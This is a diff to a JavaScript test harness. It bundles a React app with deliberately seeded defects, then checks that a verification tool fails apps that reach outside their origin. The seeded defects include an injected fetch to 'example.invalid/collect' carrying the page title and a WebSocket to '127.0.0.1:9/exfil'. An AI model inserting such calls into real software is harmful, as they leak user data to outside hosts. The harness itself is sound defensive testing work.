@@ -42,7 +42,7 @@ if (npm.status !== 0) {
   console.error(`npm install of react failed (network?):\n${npm.stderr}`);
   process.exit(2);
 }
-async function bundle(outDir, { slim = true, escapeBug = false, leak = false } = {}) {
+async function bundle(outDir, { slim = true, escapeBug = false, leak = false, leakWs = false } = {}) {
   rmSync(join(proj, outDir), { recursive: true, force: true });
   mkdirSync(join(proj, outDir), { recursive: true });
   await build({
@@ -68,7 +68,7 @@ async function bundle(outDir, { slim = true, escapeBug = false, leak = false } =
             if (escapeBug) text = text.replace("if (e.key === 'Escape') onClose();", "/* seeded bug: Escape does nothing */");
             return { contents: text, loader: "jsx" };
           });
-          b.onLoad({ filter: /main\.jsx$/ }, (a) => ({ contents: readFileSync(a.path, "utf8") + (leak ? "\nfetch('http://example.invalid/collect?d=' + document.title).catch(() => {});\n" : ""), loader: "jsx" }));
+          b.onLoad({ filter: /main\.jsx$/ }, (a) => ({ contents: readFileSync(a.path, "utf8") + (leak ? "\nfetch('http://example.invalid/collect?d=' + document.title).catch(() => {});\n" : "") + (leakWs ? "\ntry { new WebSocket('ws://127.0.0.1:9/exfil'); } catch (e) {}\n" : ""), loader: "jsx" }));
         },
       },
     ],
@@ -307,9 +307,14 @@ await scenario("Q06", "Hostile checks are refused as data, an app that reaches o
   const e = coverageOf("B-REQ-ORD-001-AC-04");
   eq(e.status, "FAIL", "an app that tries to reach example.invalid fails the check");
   check(e.evidence.some((l) => /outside the served origin/.test(l)), "and the evidence says so");
+  await bundle("dist-ws", { slim: true, leakWs: true });
+  writeChecks(["REQ-ORD-001-AC-04"], { serve: { root: "dist-ws" } });
+  await verify(true);
+  const w = coverageOf("B-REQ-ORD-001-AC-04");
+  check(w.status === "FAIL" && w.evidence.some((l) => /websocket/i.test(l)), `a WebSocket to another port is blocked and fails the check: ${JSON.stringify(w.evidence)}`);
 });
 
-await scenario("Q07", "Real work-item reality: the lab's Quality state and a re-read of persisted state still parse (old entries without provenance count only for unrevised criteria)", async () => {
+await scenario("Q07", "Real work-item reality: the lab's Quality state and a re-read of persisted state still parse (old entries without provenance are not independent proof)", async () => {
   writeChecks(allAcs);
   await verify(true);
   const state = stateOf(wi);
@@ -322,7 +327,7 @@ await scenario("Q07", "Real work-item reality: the lab's Quality state and a re-
   const s = await call(agent, "praxis_workflow_inspect", { repo: copy, workItemId: wi, view: "quality" });
   check(s.ok, `a state saved before provenance existed is read: ${JSON.stringify(s.errors)}`);
   const evs = s.data.quality.requirementEvidence;
-  eq(evs.map((x) => `${x.requirementId}:${x.status}:${x.verdict}`).sort(), ["REQ-ORD-001:executed:PASS", "REQ-ORD-002:executed:PASS", "REQ-ORD-003:executed:FAIL", "REQ-ORD-004:executed:PASS", "REQ-ORD-005:executed:PASS"], "legacy results still prove the unrevised criteria; the criterion revised since (REQ-ORD-003-AC-01) is stale and holds its requirement back");
+  eq(evs.map((x) => `${x.requirementId}:${x.status}:${x.verdict}`).sort(), ["REQ-ORD-001:executed:PASS_WITH_RISKS", "REQ-ORD-002:executed:PASS_WITH_RISKS", "REQ-ORD-003:executed:FAIL", "REQ-ORD-004:executed:PASS_WITH_RISKS", "REQ-ORD-005:executed:PASS_WITH_RISKS"], "results recorded before provenance existed are read but are not independent proof (PASS_WITH_RISKS until verify-stories runs again); the criterion revised since (REQ-ORD-003-AC-01) is stale");
 });
 
 await agent.client.close?.();
